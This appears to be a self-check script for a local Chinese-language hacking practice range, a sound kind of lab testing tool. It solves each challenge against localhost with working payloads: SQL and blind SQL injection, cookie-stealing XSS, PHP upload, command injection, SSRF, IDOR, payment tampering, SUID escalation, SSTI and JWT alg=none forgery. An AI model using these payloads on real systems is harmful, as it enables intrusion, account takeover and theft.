// 靶场自检脚本：跑通全部 12 关并验证提交流程
// 用法：先 node server.js，然后 node tools/smoke.js
const B = 'http://127.0.0.1:7788';
let pass = 0, fail = 0;
const log = (n, ok, extra) => { ok ? pass++ : fail++; console.log((ok ? '  ✓ ' : '  ✗ ') + n + (extra ? '  ' + extra : '')); };

async function main() {
  // 兼容两种运行方式：node server.js（data/ 在项目里）与 靶场.exe（data/ 在 exe 旁边）
  // 取最近被写入的那份 state.json；也可以直接传路径：node tools/smoke.js D:\path\state.json
  const fsx = require('fs');
  const pth = require('path');
  const candidates = [
    process.argv[2],
    pth.join(__dirname, '..', 'data', 'state.json'),
    pth.join(__dirname, '..', 'dist', 'data', 'state.json')
  ]
    .filter(p => p && fsx.existsSync(p))
    .sort((a, b) => fsx.statSync(b).mtimeMs - fsx.statSync(a).mtimeMs);

  if (!candidates.length) {
    console.error('找不到 state.json，请先启动靶场');
    process.exit(1);
  }
  console.log('  state: ' + candidates[0]);

  const state = JSON.parse(fsx.readFileSync(candidates[0], 'utf8'));
  const F = state.flags;
  const jar = {};

  // 1 SQLi
  let r = await fetch(B + '/lab/search?q=' + encodeURIComponent("' OR 1=1 -- "));
  let t = await r.text();
  log('SQLi 恒真注入', t.includes(F['web-sqli']));

  // 2 XSS
  await fetch(B + '/lab/guestbook', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'author=t&content=' + encodeURIComponent("<script>fetch('/lab/collect?c='+document.cookie)</script>")
  });
  await new Promise(res => setTimeout(res, 700));
  t = await (await fetch(B + '/lab/collect')).text();
  log('XSS Bot 外带', t.includes(F['web-xss']));

  // 3 Upload
  const fd = new FormData();
  fd.append('avatar', new Blob(['<?php echo 1; ?>'], { type: 'image/png' }), 'sh.php');
  r = await fetch(B + '/lab/upload', { method: 'POST', body: fd });
  t = await r.text();
  const upOk = t.includes('上传成功') || t.includes('sh.php');
  t = await (await fetch(B + '/uploads/sh.php')).text();
  log('上传绕过执行', upOk && t.includes(F['web-upload']));

  // 4 CMDi
  t = await (await fetch(B + '/lab/tools?ip=' + encodeURIComponent('127.0.0.1;cat /flag'))).text();
  log('命令注入', t.includes(F['web-cmdi']));

  // 5 SSRF
  t = await (await fetch(B + '/lab/proxy?url=' + encodeURIComponent('http://127.0.0.1:7788/internal/flag'))).text();
  log('SSRF 内网访问', t.includes(F['web-ssrf']));
  r = await fetch(B + '/internal/flag');
  log('SSRF 直连被拒', r.status === 403);

  // 6 SMS 登录 + IDOR
  r = await fetch(B + '/api/lab/sms/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone: '13800000001', code: '' })
  });
  const ck = r.headers.get('set-cookie');
  t = await r.text();
  log('验证码空值绕过', t.includes('admin'));
  const cookie = ck ? ck.split(';')[0] : '';
  t = await (await fetch(B + '/api/lab/orders/1003', { headers: { Cookie: cookie } })).text();
  log('订单越权', t.includes(F['biz-idor']));

  // 7 支付
  t = await (await fetch(B + '/api/lab/pay', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ orderId: 2001, amount: 1 })
  })).text();
  log('金额篡改', t.includes(F['biz-price']));

  // 8 后台
  t = await (await fetch(B + '/lab/admin', { headers: { Cookie: cookie } })).text();
  log('后台 flag', t.includes(F['biz-sms']));

  // 9 优惠券
  t = await (await fetch(B + '/lab/cart/coupon', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'code=NEW100&times=500'
  })).text();
  log('优惠券叠加', t.includes(F['biz-coupon']));

  // 10 泄露
  t = await (await fetch(B + '/backup/db.sql')).text();
  log('备份泄露', t.includes(F['host-leak']));

  // 11/12 主机
  r = await fetch(B + '/lab/ssh/login', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'user=ops&pass=Cloud%402024', redirect: 'manual'
  });
  const sshCookie = (r.headers.get('set-cookie') || '').split(';')[0];
  const exec = async cmd => JSON.parse(await (await fetch(B + '/api/lab/ssh/exec', {
    method: 'POST', headers: { 'Content-Type': 'application/json', Cookie: sshCookie },
    body: JSON.stringify({ cmd })
  })).text());
  let d = await exec('cat /home/ops/flag_user.txt');
  log('弱口令登录', d.output.join('\n').includes(F['host-weakpwd']));
  d = await exec('find / -perm -4000 2>/dev/null');
  const suid = d.output.join('\n').includes('/usr/local/bin/backup');
  d = await exec('./backup --restore');
  log('SUID 提权', suid && d.output.join('\n').includes(F['host-privesc']));
  d = await exec('cat /root/flag.txt');
  log('越权读 root 被拒', d.output.join('\n').includes('Permission denied'));

  // ---- 进阶三关：SSTI / 盲注 / JWT ----
  t = await (await fetch(B + '/lab/report?name=' + encodeURIComponent('报表 {{7*7}}'))).text();
  const sstiCalc = t.includes('报表 49');
  t = await (await fetch(B + '/lab/report?name=' + encodeURIComponent('{{flag}}'))).text();
  log('SSTI 模板注入', sstiCalc && t.includes(F['web-ssti']));

  const blind = async q => {
    const s = await (await fetch(B + '/lab/search/blind?q=' + encodeURIComponent(q))).text();
    const m = s.match(/命中 <strong>(\d+)<\/strong>/);
    return m ? Number(m[1]) : -1;
  };
  const b1 = await blind("摄像头%' AND 1=1 -- ");
  const b2 = await blind("摄像头%' AND 1=2 -- ");
  const b3 = await blind("摄像头%' AND SUBSTR((SELECT flag FROM secrets WHERE id=3),1,5)='flag{' -- ");
  log('布尔盲注（子查询+SUBSTR）', b1 === 1 && b2 === 0 && b3 === 1, b1 + '/' + b2 + '/' + b3);

  const jl = await (await fetch(B + '/api/lab/jwt/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: 'alice' })
  })).json();
  const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
  const forged = b64u({ alg: 'none', typ: 'JWT' }) + '.' + b64u({ sub: 'alice', role: 'admin' });
  const jm = await (await fetch(B + '/api/lab/jwt/me', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: forged })
  })).json();
  log('JWT alg=none 伪造', Boolean(jl.token) && jm.ok === true && jm.role === 'admin' && String(jm.flag || '').includes(F['biz-jwt']));

  // ---- 网络面：三个端口 + 扫描面 ----
  t = await (await fetch(B + '/.env')).text();
  log('.env 泄漏', t.includes('DB_PASSWORD'));

  t = await (await fetch(B + '/.git/HEAD')).text();
  log('.git 泄漏', t.includes('ref: refs/heads'));

  r = await fetch(B + '/uploads/');
  log('/uploads/ 目录索引', r.status === 200 && (await r.text()).includes('Index of'));

  r = await fetch(B + '/search.php.bak');
  log('备份源码泄漏', (await r.text()).includes('LIKE'));

  const httpsOk = await new Promise(res => {
    const req = require('https').request(
      { host: '127.0.0.1', port: 7789, path: '/lab', method: 'GET', rejectUnauthorized: false, timeout: 3000 },
      rr => { rr.resume(); res(rr.statusCode === 200); }
    );
    req.on('error', () => res(false));
    req.on('timeout', () => { req.destroy(); res(false); });
    req.end();
  });
  log('HTTPS 7789 可用', httpsOk);

  const banner = await new Promise(res => {
    const net = require('net');
    let buf = '';
    const s = net.connect(2222, '127.0.0.1');
    s.setEncoding('utf8');
    s.on('data', d => {
      buf += d;
      if (buf.indexOf('SSH-2.0') === 0) { s.destroy(); res(buf); }
    });
    s.on('error', () => res(''));
    setTimeout(() => { s.destroy(); res(buf); }, 1500);
  });
  log('SSH 2222 banner', banner.includes('OpenSSH'));

  // 提交全部 flag
  const ids = ['web-sqli','web-xss','web-upload','web-cmdi','web-ssrf','biz-idor','biz-price','biz-sms','biz-coupon','host-leak','host-weakpwd','host-privesc','web-ssti','web-blind','biz-jwt'];
  let subOk = 0;
  for (const id of ids) {
    const rr = await (await fetch(B + '/api/submit', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ challengeId: id, flag: F[id], actor: '冒烟测试' })
    })).json();
    if (rr.ok) subOk++;
  }
  log('全部关卡提交通过', subOk === ids.length, subOk + '/' + ids.length);
  const st = await (await fetch(B + '/api/state?actor=' + encodeURIComponent('冒烟测试'))).json();
  log('终局解锁', !st.challenges.find(c => c.id === 'final').locked, '分数 ' + st.score);
  const fin = await (await fetch(B + '/api/submit', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ challengeId: 'final', flag: F.final, actor: '冒烟测试' })
  })).json();
  log('终局提交', fin.ok, fin.message);

  console.log('\n结果：' + pass + ' 通过 / ' + fail + ' 失败');
  process.exit(fail ? 1 : 0);
}

main().catch(e => { console.error(e); process.exit(1); });
